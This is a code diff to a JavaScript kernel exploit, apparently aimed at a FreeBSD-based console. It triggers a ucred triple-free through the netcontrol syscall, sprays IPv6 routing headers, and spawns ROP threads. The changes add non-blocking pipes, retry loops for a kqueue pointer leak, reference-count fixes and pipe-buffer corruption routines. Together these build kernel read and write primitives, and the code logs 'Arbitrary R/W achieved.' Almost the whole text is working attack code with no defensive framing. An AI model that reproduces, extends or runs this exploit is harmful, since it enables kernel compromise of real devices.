@@ -86,6 +86,7 @@ var netcontrol          = fn.register(0x63,  'netcontrol',         'bigint');
 var thr_new             = fn.register(0x1C7, 'thr_new',            'bigint');
 var thr_kill            = fn.register(0x1B1, 'thr_kill',           'bigint');
 var nanosleep           = fn.register(0xF0,  'nanosleep',          'bigint');
+var fcntl               = fn.register(0x5C,  'fcntl',              'bigint');
 
 // Extract syscall wrapper addresses for ROP chains from syscalls.map
 var read_wrapper                = syscalls.map.get(0x03);
@@ -152,9 +153,9 @@ RTHDR_TAG = 0x13370000;
 UIO_IOV_NUM = 0x14;
 MSG_IOV_NUM = 0x17;
 
-IPV6_SOCK_NUM = 64;
-IOV_THREAD_NUM = 4;
-UIO_THREAD_NUM = 4;
+IPV6_SOCK_NUM = 96;
+IOV_THREAD_NUM = 8;
+UIO_THREAD_NUM = 8;
 
 MAX_ROUNDS_TWIN = 10;
 MAX_ROUNDS_TRIPLET = 200;
@@ -168,6 +169,9 @@ MAIN_RTPRIO = 0x100;
 RTP_LOOKUP = 0;
 RTP_SET = 1;
 PRI_REALTIME = 2;
+
+F_SETFL = 4;
+O_NONBLOCK = 4;
 
 
 /***************************/
@@ -189,6 +193,18 @@ var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
 var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
 var check_len = malloc(4);
 // Initialize check_len to 8 bytes (done in JavaScript before ROP runs)
+
+
+var fdt_ofiles;
+var masterRpipeFile;
+var victimRpipeFile;
+var masterRpipeData;
+var victimRpipeData;
+
+// Corrupt pipebuf of masterRpipeFd.
+    masterPipebuf = malloc(PIPEBUF_SIZE);
+
+
 write32(check_len, 8);
 
 var msg         = malloc(MSG_HDR_SIZE);
@@ -222,7 +238,7 @@ var uio_readv_workers = [];
 var uio_writev_workers = [];
 var spray_ipv6_worker;
 
-var uafSock;
+var uaf_socket;
 
 var uio_sock_0;
 var uio_sock_1;
@@ -233,6 +249,11 @@ var iov_sock_1;
 var pipe_sock = malloc(8);
 var master_pipe = []
 var victim_pipe = []
+
+var masterRpipeFd
+var masterWpipeFd
+var victimRpipeFd
+var victimWpipeFd
 
 var kq_fdp;
 var kq_lock;
@@ -357,7 +378,7 @@ function create_workers() {
         socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
         pipe_0 = read32(sock_buf);
         pipe_1 = read32(sock_buf.add(4));
-        //log("create pipe: " + pipe_0 + " " + pipe_1);
+        //debug("create pipe: " + pipe_0 + " " + pipe_1);
 
         var ret = iov_recvmsg_worker_rop(ready, pipe_0, done, signal_buf);
 
@@ -383,7 +404,7 @@ function create_workers() {
         socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
         pipe_0 = read32(sock_buf);
         pipe_1 = read32(sock_buf.add(4));
-        //log("create pipe: " + pipe_0 + " " + pipe_1);
+        //debug("create pipe: " + pipe_0 + " " + pipe_1);
 
         var ret = uio_readv_worker_rop(ready, pipe_0, done, signal_buf);
 
@@ -409,7 +430,7 @@ function create_workers() {
         socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
         pipe_0 = read32(sock_buf);
         pipe_1 = read32(sock_buf.add(4));
-        //log("create pipe: " + pipe_0 + " " + pipe_1);
+        //debug("create pipe: " + pipe_0 + " " + pipe_1);
 
         var ret = uio_writev_worker_rop(ready, pipe_0, done, signal_buf);
 
@@ -505,7 +526,7 @@ function trigger_iov_recvmsg() {
     for(var i=0; i<IOV_THREAD_NUM; i++) {
         worker = iov_recvmsg_workers[i];
         write64(worker.done, 0);
-        //log("Worker done: " + hex(read64(worker.done)) );
+        //debug("Worker done: " + hex(read64(worker.done)) );
     }
 
     // Send Init signal
@@ -523,10 +544,10 @@ function wait_iov_recvmsg() {
     for(var i=0; i<IOV_THREAD_NUM; i++) {
         worker = iov_recvmsg_workers[i];
         wait_for(worker.done, 1)
-        //log("Worker done: " + hex(read64(worker.done)) );
+        //debug("Worker done: " + hex(read64(worker.done)) );
     }
 
-    //log("iov_recvmsg workers run OK");
+    //debug("iov_recvmsg workers run OK");
 }
 
 function trigger_ipv6_spray_and_read() {
@@ -563,7 +584,7 @@ function trigger_uio_readv() {
     for(var i=0; i<UIO_THREAD_NUM; i++) {
         worker = uio_readv_workers[i];
         write64(worker.done, 0);
-        log("trigger_uio_readv done: " + hex(read64(worker.done)) );
+        //debug("trigger_uio_readv done: " + hex(read64(worker.done)) );
     }
 
     // Send Init signal
@@ -591,7 +612,7 @@ function trigger_uio_writev() {
     for(var i=0; i<UIO_THREAD_NUM; i++) {
         worker = uio_writev_workers[i];
         write64(worker.done, 0);
-        //log("trigger_uio_writev done: " + hex(read64(worker.done)) );
+        //debug("trigger_uio_writev done: " + hex(read64(worker.done)) );
     }
 
     // Send Init signal
@@ -663,6 +684,16 @@ function setup() {
     victim_pipe[0] = read32(pipe_sock);
     victim_pipe[1] = read32(pipe_sock.add(4));
 
+    masterRpipeFd = master_pipe[0]
+    masterWpipeFd = master_pipe[1]
+    victimRpipeFd = victim_pipe[0]
+    victimWpipeFd = victim_pipe[1]
+
+    fcntl(masterRpipeFd, F_SETFL, O_NONBLOCK);
+    fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK);
+    fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
+    fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);
+
     // Create and Init Thread Workers
     create_workers();
 
@@ -676,7 +707,7 @@ function cleanup() {
 
     var worker;
 
-    log("Cleaning up...");
+    debug("Cleaning up...");
 
     // Close all files.
     for (var i = 0; i < ipv6_socks.length; i++) {
@@ -694,8 +725,8 @@ function cleanup() {
             if (worker.thread_id !== undefined) {
                 //thr_kill(worker.thread_id, 9); // SIGKILL
             }
-            //close(worker.pipe_0);
-            //close(worker.pipe_1);
+            close(worker.pipe_0);
+            close(worker.pipe_1);
         }
     }
 
@@ -705,8 +736,8 @@ function cleanup() {
             if (worker.thread_id !== undefined) {
                 //thr_kill(worker.thread_id, 9); // SIGKILL
             }
-            //close(worker.pipe_0);
-            //close(worker.pipe_1);
+            close(worker.pipe_0);
+            close(worker.pipe_1);
         }
     }
 
@@ -716,25 +747,25 @@ function cleanup() {
             if (worker.thread_id !== undefined) {
                 //thr_kill(worker.thread_id, 9); // SIGKILL
             }
-            //close(worker.pipe_0);
-            //close(worker.pipe_1);
+            close(worker.pipe_0);
+            close(worker.pipe_1);
         }
     }
 
     if (spray_ipv6_worker !== undefined) {
-        //close(spray_ipv6_worker.pipe_0);
-        //close(spray_ipv6_worker.pipe_1);
+        close(spray_ipv6_worker.pipe_0);
+        close(spray_ipv6_worker.pipe_1);
     }
 
     if (prev_core >= 0) {
-        log("Restoring to previous core: " + prev_core);
+        debug("Restoring to previous core: " + prev_core);
         pin_to_core(prev_core);
         prev_core = -1;
     }
     
     set_rtprio(prev_rtprio);
 
-    log("Cleanup completed");
+    debug("Cleanup completed");
 
     thr_kill(iov_recvmsg_workers[1].thread_id, 9); // SIGKILL
 }
@@ -771,7 +802,7 @@ function find_twins_rop() {
             if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
                 twins[0] = i;
                 twins[1] = j;
-                log("[*] Twins found: [" + i + "] [" + j + "]");
+                debug("[*] Twins found: [" + i + "] [" + j + "]");
                 return true;
             }
         }
@@ -813,7 +844,7 @@ function find_twins() {
             if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
                 twins[0] = i;
                 twins[1] = j;
-                log("[*] Twins found: [" + i + "] [" + j + "]");
+                debug("[*] Twins found: [" + i + "] [" + j + "]");
                 return true;
             }
         }
@@ -865,7 +896,7 @@ function find_triplet(master, other, iterations) {
         get_rthdr(ipv6_socks[master], leak_rthdr, 8);
         val = read32(leak_add);
         j = val & 0xFFFF;
-        if (val & 0xFFFF0000 === RTHDR_TAG && j !== master && j !== other) {
+        if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
             debug("Triplet found: [" + j + "] at iteration " + count);
             return j;
         }
@@ -893,31 +924,35 @@ function netctrl_exploit() {
     prev_rtprio = get_rtprio();
     pin_to_core(MAIN_CORE);
     set_rtprio(MAIN_RTPRIO);
-    log("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);
+    debug("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);
 
     setup();
 
-    // Trigger vulnerability.
-    trigger_ucred_triplefree();
+    var end = false;
 
-    // Leak pointers from kqueue.
-    leak_kqueue();
+    while(!end) {
+        // Trigger vulnerability.
+        trigger_ucred_triplefree();
+
+        // Leak pointers from kqueue.
+        end = leak_kqueue();
+    }
 
     // Leak fd_files from kq_fdp.
     const fd_files = kreadslow64(kq_fdp);
     fdt_ofiles = fd_files.add(0x08);
     debug("fdt_ofiles: " + hex(fdt_ofiles));
 
-    const masterRpipeFile = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+    masterRpipeFile = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
     debug("masterRpipeFile: " + hex(masterRpipeFile));
 
-    const victimRpipeFile = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
+    victimRpipeFile = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
     debug("victimRpipeFile: " + hex(victimRpipeFile));
 
-    const masterRpipeData = kreadslow64(masterRpipeFile.add(0x00));
+    masterRpipeData = kreadslow64(masterRpipeFile.add(0x00));
     debug("masterRpipeData: " + hex(masterRpipeData));
 
-    const victimRpipeData = kreadslow64(victimRpipeFile.add(0x00));
+    victimRpipeData = kreadslow64(victimRpipeFile.add(0x00));
     debug("victimRpipeData: " + hex(victimRpipeData));
 
     // Corrupt pipebuf of masterRpipeFd.
@@ -927,13 +962,126 @@ function netctrl_exploit() {
     write32(masterPipebuf.add(0x08), 0);                // out
     write32(masterPipebuf.add(0x0C), PAGE_SIZE);        // size
     write64(masterPipebuf.add(0x10), victimRpipeData);  // buffer
+
     kwriteslow(masterRpipeData, masterPipebuf, PIPEBUF_SIZE);
 
-    const read_check = kreadslow64(masterRpipeData);
+    // Increase reference counts for the pipes.
+    fhold(fget(master_pipe[0]));
+    fhold(fget(master_pipe[1]));
+    fhold(fget(victim_pipe[0]));
+    fhold(fget(victim_pipe[1]));
 
-    debug("I wrote: " + hex(masterPipebuf) + " - I read: " + hex(read_check) );
+    for(i=0; i<=0x20; i=i+8) {
+        var read = kread64(masterRpipeData.add(i))
+        debug("Reading masterRpipeData[" + i + "] : " + hex(read) );
+    }
+
+    debug("[+] Arbitrary R/W achieved.");
+
+    //fhold(fget(master_pipe[0]));
+    //fhold(fget(master_pipe[1]));
+    //fhold(fget(victim_pipe[0]));
+    //fhold(fget(victim_pipe[1]));
+
+    //for (i=0; i < triplets.length; i++) {
+    //    removeRthrFromSocket(ipv6_socks[triplets[i]]);
+    //}
+
+    //removeUafFile();
 
 }
+
+function fhold(fp) {
+    kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1); // f_count
+}
+
+function fget(fd) {
+    return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
+}
+
+function removeRthrFromSocket(fd) {
+    fp = fget(fd);
+    f_data = kread64(fp.add(0x00));
+    so_pcb = kread64(f_data.add(0x18));
+    in6p_outputopts = kread64(so_pcb.add(0x118));
+    kwrite64(in6p_outputopts.add(0x68), 0); // ip6po_rhi_rthdr
+}
+
+
+const victimPipebuf = malloc(PIPEBUF_SIZE);
+
+function corruptPipebuf(cnt, _in, out, size, buffer) {
+    if (buffer.eq(0)) {
+        throw new Error("buffer cannot be zero");
+    }
+    write32(victimPipebuf.add(0x00), cnt);      // cnt
+    write32(victimPipebuf.add(0x04), _in);       // in
+    write32(victimPipebuf.add(0x08), out);      // out
+    write32(victimPipebuf.add(0x0C), size);     // size
+    write64(victimPipebuf.add(0x10), buffer);   // buffer
+    write(masterWpipeFd, victimPipebuf, PIPEBUF_SIZE);
+
+    // Debug
+    read(masterRpipeFd, victimPipebuf, PIPEBUF_SIZE);
+    for (i=0; i<PIPEBUF_SIZE; i=i+8) {
+        debug("corrupt_read: " + hex(read64(victimPipebuf.add(i))) );
+    }
+
+    return //read(masterRpipeFd, victimPipebuf, PIPEBUF_SIZE);
+}
+
+function kwrite(dest, src, n) {
+    corruptPipebuf(0, 0, 0, PAGE_SIZE, dest);
+    return write(victimWpipeFd, src, n);
+}
+
+function kread(dest, src, n) {
+    corruptPipebuf(n, 0, 0, PAGE_SIZE, src);
+    // Debug
+    read(victimRpipeFd, dest, n);
+    for (i=0; i<n; i=i+8) {
+        debug("kread_read: " + hex(read64(dest.add(i))) );
+    }
+    return
+}
+
+function kwrite64(addr, val) {
+    write64(tmp, val);
+    kwrite(addr, tmp, 8);
+}
+
+function kwrite32(addr, val) {
+    write32(tmp, val);
+    kwrite(addr, tmp, 4);
+}
+
+function kread64(addr) {
+    kread(tmp, addr, 8);
+    return read64(tmp);
+}
+
+function kread32(addr) {
+    kread(tmp, addr, 4);
+    return read32(tmp);
+}
+
+function removeUafFile() {
+    uafFile = fget(uaf_socket);
+    kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), 0);
+    removed = 0;
+    for (i = 0; i < UAF_TRIES; i++) {
+        s = socket(AF_UNIX, SOCK_STREAM, 0);
+        if (fget(s).eq(uafFile)) {
+            kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), 0);
+            removed++;
+        }
+        close(s);
+        if (removed == 3) {
+            break;
+        }
+    }
+}
+
 
 function trigger_ucred_triplefree() {
     var end = false;
@@ -982,7 +1130,7 @@ function trigger_ucred_triplefree() {
         // Note: Only dup works because it does not check f_hold.
         close(dup(uaf_socket));
 
-        log("Finding Twins...");
+        debug("Finding Twins...");
         // Find twins.
         end = find_twins();
 
@@ -1004,7 +1152,7 @@ function trigger_ucred_triplefree() {
         // debug("These are twins values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) );
 
 
-        log("Triple freeing...");
+        debug("Triple freeing...");
 
         // Free one.
         free_rthdr(ipv6_socks[twins[1]]);
@@ -1068,14 +1216,14 @@ function trigger_ucred_triplefree() {
         triplets[2] = find_triplet(triplets[0], triplets[1]);
 
         // If error start again to better exploit possibility
-         if (triplets[2] === -1) {
-             debug("Couldn't find triplet 2");
-             // Clean up and start again
-             close(uaf_socket);
-             // Start again
-             end = false;
-             continue;    
-         }
+        if (triplets[2] === -1) {
+            debug("Couldn't find triplet 2");
+            // Clean up and start again
+            close(uaf_socket);
+            // Start again
+            end = false;
+            continue;    
+        }
 
         // Let's make sure that they are indeed triplets
         // var leak_0 = malloc(8);
@@ -1099,8 +1247,8 @@ function leak_kqueue() {
     //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
     debug("Leaking kqueue...");
 
-    // Free one.
-    free_rthdr(ipv6_socks[triplets[1]]);
+    // Free one. From this point we are going to use only twins
+    free_rthdr(ipv6_socks[triplets[2]]);
 
     // Leak kqueue.
     var kq = 0;
@@ -1115,7 +1263,7 @@ function leak_kqueue() {
         // Leak with other rthdr.
         get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
-        if (read64(magic_add).eq(magic_val)) {
+        if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
             break;
         }
 
@@ -1128,10 +1276,11 @@ function leak_kqueue() {
     kq_fdp = read64(leak_rthdr.add(0x98));
 
     if (kq_fdp.eq(0)) {
-        throw new Error("Failed to leak kqueue_fdp");
+        debug("Failed to leak kqueue_fdp");
+        return false;
     }
 
-    log("kq_fdp: " + hex(kq_fdp) + " kq_lock: " + hex(kq_lock));
+    debug("kq_fdp: " + hex(kq_fdp) + " kq_lock: " + hex(kq_lock));
 
     // for (i=0; i<0x100; i=i+8) {
     //     debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
@@ -1141,7 +1290,10 @@ function leak_kqueue() {
     close(kq);
 
     // Find triplet.
-    triplets[1] = find_triplet(triplets[0], -1);
+    // No need we discarded triplets[2] and we only use twins from now on
+    //triplets[1] = find_triplet(triplets[0], -1);
+
+    return true;
 
 }
 
@@ -1217,13 +1369,13 @@ function kreadslow(addr, size) {
     }
 
     var uio_iov = read64(leak_rthdr);
-    //debug("This is uio_iov: " + hex(uio_iov));
+    debug("This is uio_iov: " + hex(uio_iov));
 
     // Prepare uio reclaim buffer.
     build_uio(msgIov, uio_iov, 0, true, addr, size);
 
     // Find new one to free
-    triplets[1] = find_triplet(triplets[0], -1, 500);
+    triplets[1] = find_triplet(triplets[0], -1, 1000);
 
     // Free second one.
     free_rthdr(ipv6_socks[triplets[1]]);
@@ -1267,7 +1419,7 @@ function kreadslow(addr, size) {
         //debug("I read from leak_buffers[" + i + "] : " + hex(val) );
         if (!val.eq(tag_val)) {
             // Find triplet.
-            triplets[1] = find_triplet(triplets[0], -1, 500);
+            triplets[1] = find_triplet(triplets[0], -1, 1000);
             leak_buffer = leak_buffers[i].add(0);
             //debug("This is leak_buffer " + hex(leak_buffer) + " - " + hex(read64(leak_buffer)));
         }
@@ -1280,7 +1432,7 @@ function kreadslow(addr, size) {
     write(iov_sock_1, tmp, 1);
 
     // Find triplet.
-    triplets[2] = find_triplet(triplets[0], triplets[1], 500);
+    //triplets[2] = find_triplet(triplets[0], triplets[1], 500);
 
     // Let's make sure that they are indeed triplets
     // var leak_0 = malloc(8);
@@ -1317,6 +1469,9 @@ function kwriteslow(addr, buffer, size) {
     // Free first triplet.
     free_rthdr(ipv6_socks[triplets[1]]);
 
+    // Minimize footprint
+    var uio_leak_add = leak_rthdr.add(0x08);
+
     // Reclaim with uio.
     while (true) {
         trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
@@ -1345,10 +1500,13 @@ function kwriteslow(addr, buffer, size) {
     build_uio(msgIov, uio_iov, 0, false, addr, size);
 
     // Find new one to free
-    triplets[1] = find_triplet(triplets[0], -1, 500);
+    triplets[1] = find_triplet(triplets[0], -1, 1000);
 
     // Free second one.
     free_rthdr(ipv6_socks[triplets[1]]);
+
+    // Minimize footprint
+    var iov_leak_add = leak_rthdr.add(0x20);
 
     // Reclaim uio with iov.
     while (true) {
@@ -1376,7 +1534,7 @@ function kwriteslow(addr, buffer, size) {
     }
 
     // Find triplet.
-    triplets[1] = find_triplet(triplets[0], -1, 500);
+    triplets[1] = find_triplet(triplets[0], -1, 1000);
 
     // Workers should have finished earlier no need to wait
     wait_uio_writev();
@@ -1427,7 +1585,7 @@ function spawn_thread(rop_array, loop_entries, stack) {
     // Fill ROP Stack
     for(var i=0 ; i < rop_array.length ; i++) {
         write64(rop_addr.add(i*8), rop_array[i]);
-        //log("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
+        //debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
     }
 
     // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
@@ -1466,7 +1624,7 @@ function spawn_thread(rop_array, loop_entries, stack) {
     write64(thr_new_args.add(0x38), cpid);               // parent_tid (output)
 
     const result = thr_new(thr_new_args, 0x68);
-    //log("thr_new result: " + hex(result));
+    //debug("thr_new result: " + hex(result));
     if (!result.eq(0)) {
         throw new Error("thr_new failed: " + hex(result));
     }
@@ -1921,4 +2079,4 @@ function ipv6_sock_spray_and_read_triplet_rop (ready_signal, run_fd, done_signal
 }
 
 netctrl_exploit();
-cleanup();
+//cleanup();
